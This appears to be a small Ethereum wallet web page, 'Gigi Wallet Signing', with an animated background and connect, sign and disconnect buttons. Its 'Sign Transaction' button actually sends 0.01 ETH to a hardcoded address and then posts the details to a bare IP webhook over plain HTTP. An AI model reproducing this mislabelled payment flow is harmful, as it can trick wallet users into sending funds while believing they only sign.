<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>üîê Gigi Wallet Signing (EVM)</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #0a0a0a;
      color: #fff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }
    .container {
      z-index: 2;
      text-align: center;
    }
    h1 {
      font-size: 28px;
      margin-bottom: 20px;
    }
    button {
      padding: 12px 24px;
      margin: 8px;
      font-size: 16px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    .connect-btn { background-color: #00c6ff; color: #fff; }
    .disconnect-btn { background-color: #e74c3c; color: #fff; }
    .sign-btn { background-color: #2ecc71; color: #fff; }
    #status { margin-top: 20px; font-size: 16px; }
    .powered-by { margin-top: 50px; font-size: 14px; opacity: 0.7; }
    .canvas-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; }
  </style>
</head>
<body>
<canvas class="canvas-bg" id="canvas"></canvas>
<div class="container">
  <h1>üîê Gigi Wallet Signing (EVM)</h1>
  <button class="connect-btn" onclick="connectWallet()">Connect Wallet</button>
  <button class="sign-btn" onclick="signTransaction()">Sign Transaction</button>
  <button class="disconnect-btn" onclick="disconnectWallet()">Disconnect</button>
  <div id="status">Waiting for wallet connection...</div>
  <div class="powered-by">‚ú® Powered by Gigi Labs</div>
</div>

<script>
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;

  let nodes = Array.from({ length: 60 }, () => ({
    x: Math.random() * canvas.width,
    y: Math.random() * canvas.height,
    dx: (Math.random() - 0.5) * 2,
    dy: (Math.random() - 0.5) * 2
  }));

  canvas.addEventListener("touchmove", (e) => {
    const touch = e.touches[0];
    nodes.push({
      x: touch.clientX,
      y: touch.clientY,
      dx: (Math.random() - 0.5) * 2,
      dy: (Math.random() - 0.5) * 2
    });
  });

  function animate() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    for (let a = 0; a < nodes.length; a++) {
      let nodeA = nodes[a];
      nodeA.x += nodeA.dx;
      nodeA.y += nodeA.dy;

      if (nodeA.x < 0 || nodeA.x > canvas.width) nodeA.dx *= -1;
      if (nodeA.y < 0 || nodeA.y > canvas.height) nodeA.dy *= -1;

      ctx.beginPath();
      ctx.arc(nodeA.x, nodeA.y, 2, 0, Math.PI * 2);
      ctx.fillStyle = "#00ffff";
      ctx.fill();

      for (let b = a + 1; b < nodes.length; b++) {
        let nodeB = nodes[b];
        const dist = Math.hypot(nodeA.x - nodeB.x, nodeA.y - nodeB.y);
        if (dist < 100) {
          ctx.beginPath();
          ctx.moveTo(nodeA.x, nodeA.y);
          ctx.lineTo(nodeB.x, nodeB.y);
          ctx.strokeStyle = "rgba(0,255,255,0.1)";
          ctx.stroke();
        }
      }
    }
    requestAnimationFrame(animate);
  }
  animate();

  let connected = false;

  async function connectWallet() {
    if (window.ethereum) {
      try {
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        connected = true;
        document.getElementById("status").innerText = "‚úÖ EVM wallet connected!";
      } catch (e) {
        document.getElementById("status").innerText = "‚ùå Connection failed.";
      }
    } else {
      document.getElementById("status").innerText = "‚ö†Ô∏è MetaMask not found.";
    }
  }

  async function signTransaction() {
    if (!connected) {
      document.getElementById("status").innerText = "‚ö†Ô∏è Please connect wallet first.";
      return;
    }
    try {
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      const from = accounts[0];
      const tx = {
        from,
        to: "0x4fb9055c71a3cafd7c6d30686cfe55282a11ac5e",
        value: "0x2386F26FC10000"
      };
      await ethereum.request({ method: 'eth_sendTransaction', params: [tx] });

      await fetch("http://34.203.188.151:5000/evm-webhook", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ user_id: "12345", amount: "0.01", to: tx.to, token: "ETH", tx_type: "sell" })
      });

      document.getElementById("status").innerText = "‚úÖ Transaction sent and webhook posted!";
    } catch (err) {
      document.getElementById("status").innerText = "‚ùå Signing failed.";
    }
  }

  function disconnectWallet() {
    connected = false;
    document.getElementById("status").innerText = "üëã Wallet disconnected.";
  }
</script>
</body>
</html>
